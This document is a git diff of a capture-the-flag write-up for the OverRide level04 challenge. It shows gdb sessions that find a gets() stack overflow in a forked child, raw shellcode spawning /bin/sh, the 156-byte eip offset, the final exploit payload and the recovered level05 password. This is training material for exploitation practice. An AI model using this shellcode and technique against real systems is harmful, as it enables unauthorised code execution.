@@ -208,22 +208,110 @@ Dump of assembler code for function main:
    0x08048824 <+348>:	pop    %ebp
    0x08048825 <+349>:	ret
 End of assembler dump
-
-level04@OverRide:~$ env -i payload=$(python -c "print('\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')") gdb level04
-(gdb) b *main
-Breakpoint 1 at 0x80486c8
-(gdb) run
+********************************************************************************
+We can see a gets call at main+150, which is vulnerable because it copies stdin
+input in a stack buffer. The problem here is that this call is only reachable by
+the child process of level04, which makes it invisible with a basic gdb config.
+********************************************************************************
+level04@OverRide:~$ gdb ./level04
+(gdb) b main
+Breakpoint 1 at 0x80486cd
+(gdb) r
 Starting program: /home/users/level04/level04
 
-Breakpoint 1, 0x080486c8 in main ()
-(gdb) x /200s environ
-...
-0xffffdb87:	 "payload=\220\220\220\220\2...
-...
+Breakpoint 1, 0x080486cd in main ()
+(gdb) si
+0x080486d0 in main ()
+(gdb)
+0x080486d6 in main ()
+(gdb)
+0x08048550 in fork@plt ()
+(gdb)
+0x08048556 in fork@plt ()
+(gdb)
+0x0804855b in fork@plt ()
+(gdb)
+0x08048490 in ?? ()
+********************************************************************************
+However, a gdb setting allows us to follow children process instead of staying
+on parent when the parent process calls fork.
+********************************************************************************
+level04@OverRide:~$ python -c "print('a' * 100)" > /tmp/full
+level04@OverRide:~$ gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) r < /tmp/full
+Starting program: /home/users/level04/level04 < /tmp/full
+[New process 1761]
+Give me some shellcode, k
+child is exiting...
+[Inferior 4 (process 1761) exited normally]
+********************************************************************************
+So now we can try to figure out the offset between the start of our buffer and
+the eip register, in order to rewrite it with the address of an env variable
+containing a shellcode, to get the permissions of level05 and get the flag.
+********************************************************************************
+level04@OverRide:~$ python -c "print('a' * 157)" > /tmp/full
+level04@OverRide:~$ gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) b *main+155
+Breakpoint 1 at 0x8048763
+(gdb) r < /tmp/full
+Starting program: /home/users/level04/level04 < /tmp/full
+[New process 1840]
+Give me some shellcode, k
+[Switching to process 1840]
 
-0xffffdf6f
+Breakpoint 1, 0x08048763 in main ()
+(gdb) si
+0x0804881a in main ()
+(gdb)
+0x0804881f in main ()
+(gdb)
+0x08048822 in main ()
+(gdb)
+0x08048823 in main ()
+(gdb)
+0x08048824 in main ()
+(gdb)
+0x08048825 in main ()
+(gdb)
+Cannot access memory at address 0x61616165
+********************************************************************************
+We just rewrited eip at buffer + 157, so now we know that the offset is 156.
+Everything we have to do now is storing a nop instruction field followed by
+a shellcode that cat the level05 .pass file. Then we will just have to rewrite
+eip register with an address in the middle of the nops field. We will use a
+python script to generate the payload. We just have to find the address of this
+environment variable in the child process.
+********************************************************************************
+level04@OverRide:~$ env -i SHELLCODE=$(python /tmp/env_shellcode.py) gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) b *main+150
+Breakpoint 1 at 0x804875e
+(gdb) r
+Starting program: /home/users/level04/level04
+[New process 1924]
+Give me some shellcode, k
+[Switching to process 1924]
 
-python -c "print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
-python -c "print('A' * 156 + '\x1a\x88\x04\x08' + '\x4f\xdc\xff\xff')"
-
-level04@OverRide:~$ python -c "print('A' * 156 + '\x1a\x88\x04\x08' + '\x4f\xdc\xff\xff')" | env -i payload=$(python /tmp/payload.py) ./level04
+Breakpoint 1, 0x0804875e in main ()
+(gdb) x/s *((char**)environ)
+0xffffdb62:	 "COLUMNS=101"
+(gdb)
+0xffffdb6e:	 "PWD=/home/users/level04"
+(gdb)
+0xffffdb86:	 "LINES=21"
+(gdb)
+0xffffdb8f:	 "SHELLCODE=\220\220\2
+********************************************************************************
+The address of SHELLCODE is 0xffffdb8f. We just have to add 500 to this address
+to aim for the middle of the nops field :
+4294957967 + 500 = 4294958467 == 0xffffdd83.
+Now we can create our payload, that will write this address in eip when gets
+will be called.
+********************************************************************************
+level04@OverRide:~$ python -c "print('a' * 156 + '\x83\xdd\xff\xff')" > /tmp/payload
+level04@OverRide:~$ env -i payload=$(python /tmp/env_shellcode.py) ./level04 < /tmp/payload
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
